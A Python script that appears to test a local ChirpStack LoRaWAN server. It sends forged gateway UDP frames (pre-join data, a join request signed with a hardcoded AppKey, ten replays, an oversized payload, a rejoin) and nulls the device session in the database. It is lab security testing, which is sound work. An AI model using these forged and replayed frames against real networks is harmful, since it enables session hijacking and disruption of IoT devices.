import socket
import json
import base64
import os
import time
import subprocess


"""
The purpose of this file is thus:
Phase 1) We will send data before a valid join request has
occured/been accepted.
1A) Send a ConfirmedDataUp with the real DevAddr before a join is triggered
Branch A: Chirpstack accepts -> document that pre-join frames are accepted
Branch B: Chirpstack rejects -> document error type and how far we got

First we will run with our current device session intact.
Then we will delete our current session and try to pre-join.

Phase 2) We will compute a valid MIC and send a valid join request
- Compute AES-CMAC frame, send via semtech UDP
- If accepted, go to phase 3
- If rejected, document error type
Phase 3) We will replay the attack with an oversized payload
- Replay attack: send same valid frame 10 times with frozen FCnt
- Oversized payload: send frame with 100 byte payload (well over SF12 limit)
Phase 4) Rejoin Attempt 
Send rejoin request type 0 frame
MHDR = 0xC0 (rejoin)
- Does Chirpstack begin a new session negotiation with the old DevAddr

"""

APP_KEY = bytes.fromhex("a1d56afb1d95226731007ed8fd15290a")
DEV_EUI = bytes.fromhex("70389cf285b755a5")
JOIN_EUI = bytes.fromhex("0000000000000000")
DEV_ADDR = bytes.fromhex("00dfd336")
GW_EUI = "2e6496d3493d6632"

POSTGRES_CONTAINER = "chirpstack-docker-postgres-1"
REDIS_CONTAINER = "chirpstack-docker-redis-1"
BRIDGE_CONTAINER = "chirpstack-docker-chirpstack-gateway-bridge-1"

from cryptography.hazmat.primitives.cmac import CMAC
from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.backends import default_backend

TARGET = ("127.0.0.1", 1700)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def send_packet(header, json_body):
    try:
        payload = header + json.dumps(json_body).encode()
        sock.sendto(payload, TARGET)
        print(f"[SENT] {payload[:80]}...")
        time.sleep(0.1)
    except Exception as e:
        print(f"[ERROR] {e}")


def send_raw(header, raw_body):
    """For cases where the body is already bytes, not a dict"""
    try:
        payload = header + raw_body
        sock.sendto(payload, TARGET)
        print(f"[SENT RAW] header + {raw_body[:40]}")
        time.sleep(0.1)
    except Exception as e:
        print(f"[ERROR] {e}")


def valid_header(packet_type=0x00):
    token = os.urandom(2)  # cryptographically random 2 bytes
    gateway_eui = bytes.fromhex("2e6496d3493d6632")  # convert to raw bytes
    return bytes([0x02]) + token + bytes([packet_type]) + gateway_eui


def run_docker_cmd(args):
    """
    Runs a docker command and returns stdout and stderr as strings.
    args = list of strings e.g.
    ["docker", "exec", "container", "psql", "-U", "chirpstack", "-c", "query"]

    capture_output=True captures both stdout and stderr
    text=True returns strings instead of bytes
    """
    result = subprocess.run(args, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[DOCKER ERROR] {result.stderr.strip()}")
    return result.stdout, result.stderr


def get_redis_stream_length(stream_key):
    """
    Returns the number of entries in a Redis stream.
    Used to detect if a frame was written to ChirpStack's
    internal streams after we send a packet.

    XLEN returns the count of entries in the stream.
    """
    stdout, _ = run_docker_cmd(
        ["docker", "exec", REDIS_CONTAINER, "redis-cli", "XLEN", stream_key]
    )
    try:
        return int(stdout.strip())
    except ValueError:
        return 0


def poll_redis_for_new_entry(stream_key, previous_count, timeout):
    """
    Polls a Redis stream for up to `timeout` seconds.
    Returns True if a new entry appeared, False if not.

    previous_count = the stream length before sending
    We check every 0.5 seconds until timeout.
    """
    timeout = 5
    import time

    elapsed = 0
    while elapsed < timeout:
        current = get_redis_stream_length(stream_key)
        if current > previous_count:
            print(f"[REDIS] New entry detected in {stream_key}")
            return True
        time.sleep(0.5)
        elapsed += 0.5
    print(f"[REDIS] No new entry in {stream_key} after {timeout}s")
    return False


def get_recent_bridge_logs(lines=20):
    """
    Fetches the most recent N lines from the Gateway Bridge container logs.
    Used after each phase to check for errors or rejections.

    --tail N = only return last N lines
    --no-color = strip ANSI color codes for clean output
    """
    stdout, _ = run_docker_cmd(
        ["docker", "logs", "--tail", str(lines), BRIDGE_CONTAINER]
    )
    return stdout


def check_logs_for_errors():
    """
    Fetches recent bridge logs and scans for known error keywords.
    Prints any lines containing error indicators.
    Returns True if any errors found.
    """
    logs = get_recent_bridge_logs()
    error_keywords = ["error", "panic", "fatal", "invalid", "unknown"]
    found = False
    for line in logs.splitlines():
        if any(kw in line.lower() for kw in error_keywords):
            print(f"[LOG ERROR] {line}")
            found = True
    return found


def compute_join_request_mic(mhdr, join_eui, dev_eui, dev_nonce):
    """
    Computes the LoRaWAN 1.0.x Join Request MIC.

    Formula from spec:
      cmac = aes128_cmac(AppKey, MHDR | JoinEUI | DevEUI | DevNonce)
      MIC  = cmac[0:4]

    All multi-byte fields are little-endian in LoRaWAN frames.
    JoinEUI and DevEUI must be reversed before insertion.
    DevNonce is 2 bytes, also little-endian.

    The cryptography library's CMAC class implements AES-128-CMAC.
    """
    # reverse byte order
    # all multi byte fields in LORA-WAN are little-endian ("le")
    # must be reversed before placed into the frame
    join_eui_le = join_eui[::-1]
    dev_eui_le = dev_eui[::-1]

    msg = mhdr + join_eui_le + dev_eui_le + dev_nonce
    c = CMAC(AES(APP_KEY), backend=default_backend())
    c.update(msg)
    full_cmac = c.finalize()

    return full_cmac[0:4]


def delete_device_session():
    """
    Nulls the device session in PostgreSQL.
    Used before Phase 1A to put the device in a genuine unjoined state.
    Does not delete the device registration — only the active session.
    """
    print("\n[DB] Deleting device session...")
    stdout, stderr = run_docker_cmd(
        [
            "docker",
            "exec",
            POSTGRES_CONTAINER,
            "psql",
            "-U",
            "chirpstack",
            "-c",
            f"UPDATE device SET device_session = NULL, dev_addr = NULL "
            f"WHERE dev_eui = '\\x{DEV_EUI.hex()}';",
        ]
    )
    print(f"[DB] {stdout.strip()}")

    


def get_device_state():
    """
    Queries PostgreSQL for the current device state.
    Returns the raw row as a string for logging.
    Specifically checks dev_addr, f_cnt_up, last_seen_at, device_session.
    """
    stdout, _ = run_docker_cmd(
        [
            "docker",
            "exec",
            POSTGRES_CONTAINER,
            "psql",
            "-U",
            "chirpstack",
            "-c",
            f"SELECT dev_addr, f_cnt_up, last_seen_at, skip_fcnt_check, "
            f"CASE WHEN device_session IS NULL THEN 'NO SESSION' "
            f"ELSE 'SESSION EXISTS' END as session_status "
            f"FROM device WHERE dev_eui = '\\x{DEV_EUI.hex()}';",
        ]
    )
    return stdout


def send_confirmedDataUp_1A():
    redis_stream_length_snapshot = get_redis_stream_length("gw:stream:frame")
    device_state_snapshot = get_device_state()
    print(f"Current redis stream length: {redis_stream_length_snapshot}")
    print(f"Current device state: {device_state_snapshot}")
    print(
        "Part 1 of Phase 1: We send a confirmedDataUp frame using our real devAddr and a frozen FCnt"
        "while the session exists in the database but the simulator is not running. Does Chirpstack accept or reject?"
    )
    frame = bytearray(19)
    frame[0] = 0x80  # 1
    frame[1:5] = bytes.fromhex("36d3df00")  # spells 00dfd336 when read
    frame[5] = 0x00  # 6
    frame[6:8] = bytes([0x00, 0x00])  # frozen at 0 # 7-8
    frame[8] = 0x01  # 9
    frame[9:15] = bytes.fromhex("aabbccddeeff")
    frame[15:19] = bytes([0x00, 0x00, 0x00, 0x00])
    encoded = base64.b64encode(bytes(frame)).decode()
    # mhdr 1 devaddr 4 le fctrl 1 fcnt 2 le fport 1 payload N mic 4
    body = {
        "rxpk": [
            {
                "data": encoded,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 19,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(2)
    poll_redis_for_new_entry("gw:stream:frame", redis_stream_length_snapshot, timeout=5)

    print(get_recent_bridge_logs())
    print(get_device_state())

    return 0


def delete_session_dataUp_1B():
    delete_device_session()
    redis_stream_length_snapshot = get_redis_stream_length("gw:stream:frame")
    print(get_device_state())
    frame = bytearray(19)
    frame[0] = 0x80  # 1
    frame[1:5] = bytes.fromhex("36d3df00")  # spells 00dfd336 when read
    frame[5] = 0x00  # 6
    frame[6:8] = bytes([0x00, 0x00])  # frozen at 0 # 7-8
    frame[8] = 0x01  # 9
    frame[9:15] = bytes.fromhex("aabbccddeeff")
    frame[15:19] = bytes([0x00, 0x00, 0x00, 0x00])
    encoded = base64.b64encode(bytes(frame)).decode()
    # mhdr 1 devaddr 4 le fctrl 1 fcnt 2 le fport 1 payload N mic 4
    body = {
        "rxpk": [
            {
                "data": encoded,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 19,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(2)
    poll_redis_for_new_entry("gw:stream:frame", redis_stream_length_snapshot, timeout=5)
    print(get_recent_bridge_logs())
    print(get_device_state())

    return 0


def valid_join_req_MIC_2():
    """
    in order to get Chirpstack to go from unjoined to joined without the use of the simulator we compute and set a correctly formatted
    join request. AES-CMAC is the encryption scheme used
    """
    redis_stream_length_snapshot = get_redis_stream_length("gw:stream:frame")
    device_state_snapshot = get_device_state()
    print(f"Current redis stream length: {redis_stream_length_snapshot}")
    print(f"Current device state: {device_state_snapshot}")
    print(
        "Phase 2: We have tested how Chirpstack reacts to an unjoined state. In order to transform to a joined state without manual"
        " use of the simulator, we compute and send a valid join request"
    )
    # frame = bytearray(23)
    mhdr = bytes([0x00])
    join_eui_le = JOIN_EUI[::-1]  # reversed
    dev_eui_le = DEV_EUI[::-1]  # reversed
    dev_nonce = os.urandom(2)  # random 2 bytes
    mic = compute_join_request_mic(mhdr, JOIN_EUI, DEV_EUI, dev_nonce)
    frame = mhdr + join_eui_le + dev_eui_le + dev_nonce + mic

    encoded = base64.b64encode(bytes(frame)).decode()
    body = {
        "rxpk": [
            {
                "data": encoded,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 23,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(2)
    poll_redis_for_new_entry("gw:stream:frame", redis_stream_length_snapshot, timeout=5)
    print(get_recent_bridge_logs())
    print(get_device_state())
    return 0


def replay_then_oversized_3():
    """
    After a successful join request from phase 2 we should be in a different state. We are now going to send the same frame repeatedly since
    fcnt_check_skip is set to true. This should be rejected but may not be. Then we are going to send a ridiculously oversized frame
    to check integrity protection for size.
    """
    state = get_device_state()
    if "NO SESSION" in state:
        print("[ABORT] No active session — Phase 2 must succeed before Phase 3")
        return 0
    redis_stream_length_snapshot = get_redis_stream_length("gw:stream:frame")
    print(state)

    frame = bytearray(19)
    frame[0] = 0x80  # 1
    frame[1:5] = bytes.fromhex("36d3df00")  # 2-5
    frame[5] = 0x00  # 6
    frame[6:8] = bytes([0x00, 0x00])  # frozen at 0 # 7-8
    frame[8] = 0x01  # 9
    frame[9:15] = bytes.fromhex("aabbccddeeff")
    frame[15:19] = bytes([0x00, 0x00, 0x00, 0x00])
    encoded = base64.b64encode(bytes(frame)).decode()
    # mhdr 1 devaddr 4 le fctrl 1 fcnt 2 le fport 1 payload N mic 4
    body = {
        "rxpk": [
            {
                "data": encoded,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 19,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(2)
    poll_redis_for_new_entry("gw:stream:frame", redis_stream_length_snapshot, timeout=5)
    print(get_recent_bridge_logs())
    print(get_device_state())
    print("Replay attack - sending frame 10 times")

    for x in range(10):
        redis_stream_length_snapshot = get_redis_stream_length("gw:stream:frame")
        send_packet(valid_header(), body)
        time.sleep(2)
        poll_redis_for_new_entry(
            "gw:stream:frame", redis_stream_length_snapshot, timeout=5
        )
        print(f"[REPLAY] Iteration {x + 1}/10")

    print(get_recent_bridge_logs())
    print(get_device_state())

    print("Part 2 of Phase 3 - Oversized payload check")
    redis_stream_length_snapshot_2 = get_redis_stream_length("gw:stream:frame")
    frame2 = bytearray(113)
    frame2[0] = 0x80
    frame2[1:5] = bytes.fromhex("36d3fd00")  # 2-5
    frame2[5] = 0x00  # 6
    frame2[6:8] = bytes([0x00, 0x00])  # frozen at 0 # 7-8
    frame2[8] = 0x01  # 9
    frame2[9:109] = os.urandom(100)
    # 100 bytes well over limit
    frame2[109:113] = bytes([0x00, 0x00, 0x00, 0x00])
    encoded2 = base64.b64encode(bytes(frame2)).decode()
    body = {
        "rxpk": [
            {
                "data": encoded2,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 113,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(2)
    poll_redis_for_new_entry(
        "gw:stream:frame", redis_stream_length_snapshot_2, timeout=5
    )
    print(get_recent_bridge_logs())
    print(get_device_state())
    print(f"[REPLAY] Iteration {x + 1}/10")

    return 0


def rejoinframe_new_session_4():
    """
    We send a rejoin request frame to trigger a new session and then immediately send frames using the PREVIOUS devaddr during the short
    window where both the new and old sessions are open. Check to see if the old session is correctly invalidated.
    """
    state = get_device_state()
    if "NO SESSION" in state:
        print("[ABORT] No active session — Phase 3 must succeed before Phase 4")
        return 0
    redis_stream_length_snapshot = get_redis_stream_length("gw:stream:frame")
    print(
        "Part 1 of Phase 4: We send a rejoin request frame to trigger a new session. Then immediately a new data frame is sent"
        "with the old devaddr during the window where the old and new sessions are active."
    )
    print(get_device_state())
    frame = bytearray(19)
    frame[0] = 0xC0  # rejoin request
    frame[1] = 0x00  # type 0 rejoin
    frame[2:5] = bytes([0x00, 0x00, 0x00])
    # DEV_EUI   = bytes.fromhex("70389cf285b755a5")
    dev_eui_le = DEV_EUI[::-1]
    frame[5:13] = dev_eui_le
    frame[13:15] = bytes([0x00, 0x00])  # rejoin counter starts at 0
    frame[15:19] = bytes([0x00, 0x00, 0x00, 0x00])  # mic
    encoded = base64.b64encode(bytes(frame)).decode()
    body = {
        "rxpk": [
            {
                "data": encoded,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 19,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(0.5)
    poll_redis_for_new_entry("gw:stream:frame", redis_stream_length_snapshot, timeout=2)
    print(get_recent_bridge_logs())
    print(get_device_state())

    print(
        "Part 2 of Phase 4: Old frame sent. This part needs to happen immediately after"
    )
    redis_stream_length_snapshot_2 = get_redis_stream_length("gw:stream:frame")
    frame2 = bytearray(19)
    frame2[0] = 0x80  # 1
    frame2[1:5] = bytes.fromhex("36d3fd00")  # 2-5
    frame2[5] = 0x00  # 6
    frame2[6:8] = bytes([0x00, 0x00])  # frozen at 0 # 7-8
    frame2[8] = 0x01  # 9
    frame2[9:15] = bytes.fromhex("aabbccddeeff")
    frame2[15:19] = bytes([0x00, 0x00, 0x00, 0x00])
    encoded2 = base64.b64encode(bytes(frame2)).decode()
    # mhdr 1 devaddr 4 le fctrl 1 fcnt 2 le fport 1 payload N mic 4
    body = {
        "rxpk": [
            {
                "data": encoded2,
                "freq": 867.1,
                "datr": "SF12BW125",  # valid datr field
                "modu": "LORA",  # modulation type
                "codr": "4/5",  # coding rate
                "rssi": -60,  # signal strength
                "lsnr": 7,  # signal to noise ratio
                "size": 19,  # frame size in bytes
                "tmst": 1000,  # timestamp
                "chan": 0,  # channel number
                "rfch": 0,  # radio frequency chain
                "stat": 1,  # CRC status (1 = OK)
            }
        ]
    }
    send_packet(valid_header(), body)
    time.sleep(2)
    poll_redis_for_new_entry(
        "gw:stream:frame", redis_stream_length_snapshot_2, timeout=5
    )
    print(get_recent_bridge_logs())
    print(get_device_state())

    return 0


if __name__ == "__main__":
    print("[TEST] Checking Docker connectivity...")
    print(get_device_state())
    print(
        f"[TEST] Redis gw stream length: {get_redis_stream_length('gw:stream:frame')}"
    )
    print("[TEST] Recent bridge logs:")
    print(get_recent_bridge_logs(5))

    send_confirmedDataUp_1A()
    input("Data request pre-join complete. See logs then press enter.")
    delete_session_dataUp_1B()
    input("Session deleted and join request sent. See logs then press enter.")

    valid_join_req_MIC_2()
    input("Joined with valid MIC request. See logs then press enter.")

    replay_then_oversized_3()
    input(
        "In the joined state. Replay attack and oversized payload. See logs then press enter."
    )

    rejoinframe_new_session_4()
    input("Rejoin request sent. See session negotiation logs then press enter.")

    input("\n Press Enter to exit...")
